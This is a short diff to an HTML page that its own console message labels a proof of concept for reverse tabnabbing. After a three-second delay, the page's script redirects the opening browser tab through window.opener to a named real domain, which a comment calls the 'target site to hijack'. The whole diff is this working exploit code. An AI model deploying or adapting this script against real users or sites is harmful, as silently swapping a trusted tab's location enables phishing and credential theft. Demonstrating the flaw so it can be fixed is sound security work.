@@ -6,10 +6,17 @@
 <body>
 <h1>Welcome</h1>
 <script>
-  // Trigger redirect on opener after page load
-  if (window.opener) {
-    window.opener.location = "https://vantagepoint.co.th"; // target site to hijack
-  }
+  console.log("PoC loaded. Waiting to redirect opener...");
+
+  // Delay execution by 3 seconds
+  setTimeout(function() {
+    if (window.opener) {
+      console.log("Redirecting opener to https://vantagepoint.co.th");
+      window.opener.location = "https://vantagepoint.co.th"; // target site to hijack
+    } else {
+      console.log("No opener detected, cannot redirect.");
+    }
+  }, 3000); // 3000ms = 3 seconds
 </script>
 </body>
 </html>
